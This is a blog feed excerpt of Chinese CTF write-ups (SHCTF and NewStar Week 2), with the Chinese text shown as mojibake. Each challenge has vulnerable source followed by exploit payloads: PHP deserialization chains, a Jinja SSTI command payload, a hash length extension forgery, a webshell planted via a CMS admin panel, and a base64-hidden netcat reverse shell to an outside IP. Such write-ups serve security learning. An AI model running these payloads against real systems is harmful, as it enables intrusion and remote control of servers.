class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œååºåˆ—åŒ–å¤´å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œç„¶åç”¨å¼•ç”¨ç»•è¿‡miaomiao()æ–¹æ³•</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;a = &amp;<span class="variable">$a</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">wanna</span><span class="punctuation">[</span><span class="variable">fl</span><span class="operator">.</span><span class="variable">ag</span><span class="operator">=</span><span class="variable">a</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">i</span><span class="operator">:</span><span class="number">0</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;musca&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;ding&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;misca&quot;</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;gao&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;fei&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;milaoshu&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;v&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">52</span><span class="operator">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;a&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">4</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>fast_destruct ç»•è¿‡wakeupï¼Œexpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">try</span>=O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce">[WEEK2]ez_rce</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj, arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, i)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj, arg, num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg) - <span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp, arg[i + <span class="number">1</span>], num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme, num, bol</span>):</span><br><span class="line">    c = gett(subprocess, giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess, giveme, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>) == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp, num, bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹ï¼š</p><p>1.è¿™é‡Œçš„subprocess.callçš„shellå±æ€§é»˜è®¤ä¸ºfalseï¼Œåªèƒ½æ‰§è¡Œå•ä¸ªå‘½ä»¤</p><p>2.callå’Œrunç­‰å‡½æ•°ä¸€æ ·ï¼Œä»–ä»¬éƒ½æ˜¯ä½¿ç”¨Popenè¿›è¡Œå°è£…çš„ï¼Œè¿è¡Œæ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªï¼Œå‚è€ƒhttps://blog.csdn.net/wzj_110/article/details/116612425</p><p>3.ä½¿ç”¨__defaults__æ–¹æ³•æ˜¯å¯ä»¥è·å¾—æŸå‡½æ•°æˆ–è€…ç±»å†…çš„æ‰€æœ‰å±æ€§</p><p>æ€»ä½“æ€è·¯å°±æ˜¯æ‰¾åˆ°Popené‡Œé¢çš„shellå±æ€§ï¼Œå°†å…¶ä¿®æ”¹ä¸ºtrueï¼Œè¿›è€Œè®©callæ‰§è¡Œå¤šæ®µå‘½ä»¤</p><p>ä¸€é˜¶æ®µpayloadå¦‚ä¸‹:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span></span><br><span class="line">?<span class="attr">num</span><span class="operator">=</span><span class="number">7</span><span class="variable">&amp;bol</span>=<span class="number">1</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;exp&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;Popen&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__defaults__&quot;</span>:<span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>äºŒé˜¶æ®µpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">exec</span>=ok&amp;shell=`echo <span class="attribute">bmMgMTEwLjQxLjE3LjE4MyAyNTAgLWUgL2Jpbi9zaA</span>== | base64 -d`</span><br></pre></td></tr></table></figure><h2 id="WEEK2-MD5çš„äº‹å°±æ‹œæ‰˜äº†">[WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº†</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹ï¼šå“ˆå¸Œæ‹“å±•é•¿åº¦æ”»å‡»ï¼Œå·¥å…·hashpumpï¼Œä¸‹é¢ä¼šä¸¾ä¾‹è¯´æ˜</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature:  <span class="keyword">key</span>å’Œæ˜æ–‡åŠ å¯†åå¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line"><span class="keyword">Input</span> Data:  ç»™å‡ºçš„æ˜æ–‡</span><br><span class="line"><span class="keyword">Input</span> <span class="keyword">Key</span> <span class="keyword">Length</span>:  <span class="keyword">key</span>çš„é•¿åº¦</span><br><span class="line"><span class="keyword">Input</span> Data to <span class="keyword">Add</span>:  æƒ³è¦æ·»åŠ çš„æ•°å€¼ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»å¾—æœ‰çš„ï¼Œå°±ç®—æ²¡ç”¨</span><br><span class="line">æœ€åå¾—åˆ°çš„ç»“æœæ˜¯ç»“åˆæ›´æ–°åå†…å®¹å¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line">åé¢æ˜¯ä¼ªé€ çš„password</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡ŒæŠŠflagçš„æœ€åä¸€ä¸ªå­—ç¬¦&#125;å½“æˆå·²çŸ¥çš„å­—ç¬¦è¿›è¡Œä¼ªé€ æ–°çš„<span class="built_in">md5</span>å€¼ï¼ŒæŠŠå‰©ä¸‹çš„flagå½“ä½œ<span class="built_in">key</span></span><br></pre></td></tr></table></figure><p>ä¸€é˜¶æ®µï¼šè·å¾—flagçš„md5å’Œé•¿åº¦ï¼Œå¼€å§‹å°±æ˜¯ä¸€ä¸ªurlæ‹†åˆ†å¥—å¨ƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170602470.png" alt="image-20231015170602470"></p><p>äºŒé˜¶æ®µï¼šè¿›è¡Œmd5ä¼ªé€ </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170757186.png" alt="image-20231015170757186"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å‚çš„æ—¶å€™å»æ‰æœ€å‰é¢çš„&#125;ï¼Œå› ä¸ºçœŸæ­£çš„<span class="built_in">key</span>ï¼ˆflagï¼‰ï¼Œåé¢æ˜¯è‡ªå¸¦ä¸€ä¸ª&#125;çš„</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?length<span class="operator">=</span><span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>P<span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>a</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">SHCTF<span class="operator">=</span>d<span class="number">285</span><span class="keyword">c</span><span class="number">0</span>becc<span class="number">667923569236</span>d<span class="number">9</span>eed<span class="number">60</span><span class="keyword">c</span><span class="number">79</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h2><p>ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">åœ¨hackerbaréšæ‰‹ç‚¹äº†ä¸ªexpå°±getshelläº†</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ä¸Šæœåå°ï¼Œ<span class="literal">admin</span>/<span class="literal">admin</span>.phpï¼Œå¯†ç æ˜¯taoï¼Œè¿›å…¥åå°å‘ç°å¯ä»¥ç¼–è¾‘æ–‡ä»¶ï¼Œç›´æ¥å†™ä¸ªé©¬ï¼Œèšå‰‘è¿æ¥ç»“æŸæˆ˜æ–—</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å±±æ²³CTFï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 2</title>
    <link href="https://bowuchuling.github.io/posts/1837dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837dhw7.html</id>
    <published>2023-10-13T12:41:55.196Z</published>
    <updated>2023-10-13T12:48:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK 2</h1><h2 id="æ¸¸æˆé«˜æ‰‹">æ¸¸æˆé«˜æ‰‹</h2><p>ç®€å•çš„JSå°æ¸¸æˆ</p><p><strong>å¦‚æœä½ åƒæˆ‘ä¸€æ ·æ— èŠï¼Œä½ å¯ä»¥å°è¯•å°†é£æœºæ‹‰è‡³æœ€ä¸‹æ–¹ï¼Œé™ç­‰flag</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013201850838.png" alt="image-20231013201850838"></p><p>æ‰¾åˆ°äº†ä¸‹é¢è¿™æ®µä»£ç ï¼Œå¤§æ¦‚å°±æ˜¯ç©å¤Ÿåˆ†æ•°ç»™ä½ ä¿¡æ¯çš„æ„æ€</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202021581.png" alt="image-20231013202021581"></p><p>è¿™é‡Œæ‰§è¡Œåœ¨æ§åˆ¶å°è¿›è¡Œå˜é‡å®šä¹‰ï¼Œç„¶åç›´æ¥å»é€ï¼Œå¾—åˆ°flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202154600.png" alt="image-20231013202154600"></p><h2 id="include-0ã€‚0">include 0ã€‚0</h2><p>æºä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>è€ƒä¼ªåè®®ï¼Œè¿‡æ»¤äº†baseå’Œrotï¼Œè¿™é‡Œç”¨å…¶ä»–ç¼–ç è¿›è¡Œç»•è¿‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>è§£å¯†è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stringa</span> = <span class="string">&quot;è·å¾—çš„åŠ 